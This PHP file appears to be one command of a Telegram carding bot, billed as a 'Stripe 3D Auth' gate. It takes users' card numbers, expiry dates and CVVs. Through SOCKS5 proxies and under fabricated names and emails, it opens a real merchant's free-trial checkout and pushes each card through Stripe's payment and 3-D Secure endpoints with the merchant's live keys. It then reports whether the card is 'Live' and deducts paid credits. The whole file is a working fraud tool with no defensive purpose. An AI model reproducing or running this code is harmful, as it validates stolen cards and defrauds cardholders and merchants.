<?php
$start_time = microtime(true);

if ($text == '/su') {
$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "𝐆𝐚𝐭𝐞 𝐈𝐧𝐟𝐨 - <b>\n• Stripe 3D Auth (v2) - /su \n• Other Gates - /cmds </b> ",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝘾𝙧𝙚𝙙𝙞𝙩𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$credits_file = file_get_contents('Tools/Credits.txt');
$credits_lines = explode("\n", $credits_file);
foreach ($credits_lines as $line) {
  if (strpos($line, $userId) === 0) {
    $user_credits = intval(substr($line, strlen($userId) + 1));
    break;
  }
}
if ($user_credits < 1) { $url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
            $data = http_build_query(array(
                'chat_id' => $chat_id,
                'message_id' => $message_idd,
                'text' => "𝐃𝐞𝐚𝐫 <b><a href='tg://user?id=$userId'>$username</a></b> 𝐘𝐨𝐮 𝐃𝐨𝐧'𝐭 𝐇𝐚𝐯𝐞 𝐒𝐮𝐟𝐟𝐢𝐜𝐢𝐞𝐧𝐭 𝐂𝐫𝐞𝐝𝐢𝐭𝐬 𝐓𝐨 𝐔𝐬𝐞 𝐓𝐡𝐢𝐬 𝐂𝐨𝐦𝐦𝐚𝐧𝐝",
                'parse_mode' => 'HTML'
            ));
            $response = sendAsyncRequest($url, $data);exit();}

include 'Tools/Regex.php';

if ( empty($cc) or empty($mes) or empty($year) or empty($cvv) ) 
{$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "<b>⚠ [𝑨𝑳𝑬𝑹𝑻] 𝑷𝑳𝑬𝑨𝑺𝑬 𝑪𝑯𝑬𝑪𝑲 𝑻𝑯𝑬 𝑰𝑵𝑷𝑼𝑻 𝑭𝑰𝑬𝑳𝑫𝑺 𝑨𝑵𝑫 𝑻𝑹𝒀 𝑨𝑮𝑨𝑰𝑵 - 𝑻𝒆𝒙𝒕 𝑺𝒉𝒐𝒖𝒍𝒅 𝑶𝒏𝒍𝒚 𝑪𝒐𝒏𝒕𝒂𝒊𝒏 𝒄𝒄 𝒎𝒐𝒏 𝒚𝒆𝒂𝒓 𝒄𝒗𝒗 </b>",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);exit();
}
include 'Tools/Antispam.php';

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙎𝙩𝙖𝙧𝙩𝙚𝙙 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘾𝙖𝙧𝙙 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$i = explode("|", $lista);
$cc = $i[0];
$c1 = substr($cc, 0, 4); 
$c2 = substr($cc, 4, 4); 
$c3 = substr($cc, 8, 4); 
$c4 = substr($cc, -4);
$mon = $i[1];
$year = $i[2];
$cvv = $i[3];

if(strlen($year) == 4){
$year = substr($year, 2);
};

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$first = ucfirst(str_shuffle('mealGBWGDSGDGthamkerxzz987654232'));
$last = ucfirst(str_shuffle('Hackerzzisbestokvai'));
$com = ucfirst(str_shuffle('waifuu'));
$first1 = str_shuffle("Hackerxz34fvHJVDVzbotopvai");

///////////////////////////////////////////////////////////////////////////////////////////////////////////////

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://lookup.binlist.net/'.$cc.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'Host: lookup.binlist.net',
'Cookie: _ga=GA1.2.549903363.1545240628; _gid=GA1.2.82939664.1545240628',
'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8'));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, '');
$fim = curl_exec($ch);
$bank1 = GetStr($fim, '"bank":{"name":"', '"');
$name2 = GetStr($fim, '"name":"', '"');
$brand = GetStr($fim, '"brand":"', '"');
$country = GetStr($fim, '"country":{"name":"', '"');
$emoji = GetStr($fim, '"emoji":"', '"');
$name1 = "".$name2."".$emoji."";
$scheme = GetStr($fim, '"scheme":"', '"');
$type = GetStr($fim, '"type":"', '"');
$currency = GetStr($fim, '"currency":"', '"');
if(strpos($fim, '"type":"credit"') !== false){
$bin = 'Credit';
}else{
$bin = 'Debit';
}

# 01 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.skillsoft.com/signup/checkout');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); curl_setopt($ch, CURLOPT_PROXY, $proxy); curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'origin: https://www.skillsoft.com',
'referer: https://www.skillsoft.com/freetrial/account-info?choosePlan=Individual%20monthly&chooseCollection=Skillsoft%20Business%20Skills%20Collection&chooseSubTotal=%E2%82%B9815/mo',
'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'content-type: application/json',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-origin',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, '{"successUrl":"https://www.skillsoft.com/get-free-trial/thank-you?order={CHECKOUT_SESSION_ID}","cancelUrl":"https://www.skillsoft.com/get-free-trial","priceId":"price_1LZzytSBQB5AiQmeelTOvqNc","currency":"inr","quantity":1,"subscriptionType":"Individual","marketingCommunications":true,"email":"'.$first.'@flipkart.com","firstName":"ajay","lastName":"singh","percipioGroup":"BusinessOffering","companyName":"","siteName":"","firstTouchTimestamp":"2023-01-07T01:36:06+05:30","firstTouchReferringUrl":"","firstTouchQueryParams":"","firstTouchLandingPage":"https://www.skillsoft.com/","lastTouchTimestamp":"2023-01-14T11:45:44+05:30","lastTouchReferringUrl":"","lastTouchQueryParams":"","lastTouchLandingPage":"https://www.skillsoft.com/get-free-trial","previousPage":"https://www.skillsoft.com/freetrial/choose-collection?billingFrequency=monthly&subscriptionType=individual-collection&currency=inr","isGK":null}');
$curl1 = curl_exec($ch);
$cs = trim(strip_tags(getStr($curl1,'sessionId":"','"}')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝘼𝙘𝙘𝙤𝙪𝙣𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#02. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mon.'&card[exp_year]='.$year.'&billing_details[name]=Ajay+Singh&billing_details[email]='.$first.'%40flipkart.com&billing_details[address][country]=IN&billing_details[address][line1]=400001%2C+Madh+Fort+Road&billing_details[address][city]=Mumbai&billing_details[address][postal_code]=400061&billing_details[address][state]=MH&guid=bdcc9e08-4ad6-422a-8baf-ee58e8d92c2900bf33&muid=47ef2fa0-c149-44be-a964-5e671a2303dd94a72c&sid=4f883dac-f54b-4d6d-b05f-ed4438d6ba4470a185&_stripe_account=acct_1Kv0HHSBQB5AiQme&key=pk_live_xhdXHVtroSyd5bXCfDodwFmw002ij18KYD&payment_user_agent=stripe.js%2F72c5b37d6%3B+stripe-js-v3%2F72c5b37d6%3B+checkout');
$curl2 = curl_exec($ch);
$pid = trim(strip_tags(getStr($curl2,'"id": "','",')));
$pme = trim(strip_tags(getStr($curl2,'message": "','",')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙂𝙤𝙞𝙣𝙜 𝙏𝙤 𝘾𝙝𝙚𝙘𝙠𝙤𝙪𝙩 𝙋𝙖𝙜𝙚 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 03 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_pages/'.$cs.'/confirm');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'eid=NA&payment_method='.$pid.'&expected_amount=0&expected_payment_method_type=card&_stripe_account=acct_1Kv0HHSBQB5AiQme&key=pk_live_xhdXHVtroSyd5bXCfDodwFmw002ij18KYD');
$curl3 = curl_exec($ch);
$src = trim(strip_tags(getStr($curl3,'three_d_secure_2_source": "','",')));
$seti1 = trim(strip_tags(getStr($curl3,'client_secret": "','",')));
$seti2= trim(strip_tags(getStr($curl3,'client_secret": "','_secret')));
$cstatus = trim(strip_tags(getStr($curl3,'status": "','",')));
$ce = trim(strip_tags(getStr($curl3,'message": "','.')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙧𝙚𝙖𝙩𝙞𝙣𝙜 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙏𝙤𝙠𝙚𝙣 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

#04. Req
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/3ds2/authenticate');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials);
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'POST');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://checkout.stripe.com',
'referer: https://checkout.stripe.com/',
'sec-ch-ua: "Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
'sec-ch-ua-mobile: ?0',
'sec-ch-ua-platform: "Windows"',
'sec-fetch-dest: empty',
'sec-fetch-mode: cors',
'sec-fetch-site: same-site',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_POSTFIELDS, 'source='.$src.'&browser=%7B%22fingerprintAttempted%22%3Afalse%2C%22fingerprintData%22%3Anull%2C%22challengeWindowSize%22%3Anull%2C%22threeDSCompInd%22%3A%22Y%22%2C%22browserJavaEnabled%22%3Afalse%2C%22browserJavascriptEnabled%22%3Atrue%2C%22browserLanguage%22%3A%22en-US%22%2C%22browserColorDepth%22%3A%2224%22%2C%22browserScreenHeight%22%3A%22864%22%2C%22browserScreenWidth%22%3A%221536%22%2C%22browserTZ%22%3A%22-330%22%2C%22browserUserAgent%22%3A%22Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML%2C+like+Gecko)+Chrome%2F108.0.0.0+Safari%2F537.36%22%7D&one_click_authn_device_support[hosted]=false&one_click_authn_device_support[same_origin_frame]=false&one_click_authn_device_support[spc_eligible]=true&one_click_authn_device_support[webauthn_eligible]=true&one_click_authn_device_support[publickey_credentials_get_allowed]=true&key=pk_live_xhdXHVtroSyd5bXCfDodwFmw002ij18KYD&_stripe_account=acct_1Kv0HHSBQB5AiQme');
$curl4 = curl_exec($ch);
$astatus = trim(strip_tags(getStr($curl4,'state": "','"')));
$edn = trim(strip_tags(getStr($curl4,'errorDescription": "','",')));
$aem = trim(strip_tags(getStr($curl4,'message": "','.')));

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝙋𝙖𝙮𝙢𝙚𝙣𝙩 𝙄𝙣 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

# 05 Req..
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/setup_intents/'.$seti2.'?key=pk_live_xhdXHVtroSyd5bXCfDodwFmw002ij18KYD&_stripe_account=acct_1Kv0HHSBQB5AiQme&is_stripe_sdk=false&client_secret='.$seti1.'');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']); 
curl_setopt($ch, CURLOPT_CONNECTTIMEOUT,15); 
curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, 1); 
curl_setopt($ch, CURLOPT_PROXY, $proxy); 
curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_SOCKS5); 
curl_setopt($ch, CURLOPT_PROXYUSERPWD,$credentials); 
curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
$headers = array(
'content-type: application/x-www-form-urlencoded',
'origin: https://js.stripe.com',
'referer: https://js.stripe.com/',
'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
curl_setopt($ch, CURLOPT_HEADER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, false);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
$curl5 = curl_exec($ch);
$dcode = trim(strip_tags(getStr($curl5,'decline_code": "','",')));
$fstatus = trim(strip_tags(getStr($curl5,'status": "','",')));
$messagee = trim(strip_tags(getStr($curl5,'"message": "','",')));
$fme = trim(strip_tags(getStr($curl5,'message": "','.')));
curl_close($ch);

if (strpos($curl5, 'status": "succeeded'))
{ $creditsToDeduct = 2;} 
else 
{ $creditsToDeduct = 1;}
$creditsFile = fopen('Tools/Credits.txt', 'r+');
while (!feof($creditsFile)) {
    $line = fgets($creditsFile);
    $lineParts = explode(' ', $line);
    $userIdd = trim($lineParts[0]);
    $credits = intval(trim($lineParts[1]));
    if ($userIdd == $userId) {
        $newCredits = max(0, $credits - $creditsToDeduct);
        fseek($creditsFile, -strlen($line), SEEK_CUR);
        fwrite($creditsFile, "$userId $newCredits\n");
        break;}}
fclose($creditsFile);

$url = 'https://api.telegram.org/bot'.$bot_token.'/editMessageText';
    $data = http_build_query(array(
        'chat_id' => $chat_id,
        'message_id' => $message_idd,
        'text' => "[ 𝙎𝙩𝙖𝙩𝙪𝙨 - 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚𝙙 𝙎𝙚𝙣𝙙𝙞𝙣𝙜 𝙍𝙚𝙨𝙪𝙡𝙩 ]",
        'parse_mode' => 'HTML'
    ));
    sendAsyncRequest($url, $data);

$end_time = microtime(true);
$time0 = $end_time - $start_time;
$time = substr_replace($time0, '',4);

if (strpos($curl2, 'card_error')) {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $pme )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl3, 'card_error')) {
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $ce - $cstatus )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl3, 'invalid_request_error')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $ce - $cstatus )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl3, 'three_d_secure_redirect')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, '3ds2')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( 3D Authentication - Redirected To Bank's Authentication Page )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'card_error')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $messagee )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'requires_payment_method')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth ( $messagee )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
elseif (strpos($curl5, 'status": "succeeded')){
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ✅ Stripe Auth Live ( $fstatus )\n--» <u>3D Auth Status </u> : $astatus\n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}
else{
$ccrsp = "<b>• TranSaction Info :- </b>\n\n--» <u>Card Details 💳</u> : <code>$lista</code>\n--» <u>Only Card 💳</u> : <code>$cc</code>\n--» <u>Card Status </u> : ❌ Failed To Auth \n--» <u>Gateway </u> : Stripe 3D Auth (v2)\n\n<b>• Bin Info :- </b>\n\n--» <b><u>Bank🏦</u> : $bank1 - $brand - $bin - $name2 - $currency</b>\n\n<b>• Other Info :- </b>\n\n-» <u>Took ⌛</u> : $time seconds \n-» <u>Credits Left </u> : <code>$newCredits </code>\n-» <u>Checked By 🤵</u> : <b><a href='tg://user?id=$userId'>$userId</a></b> \n-» <u>Bot By 👨‍💼</u> : <code>Tkkytrs</code>\n";
}

?>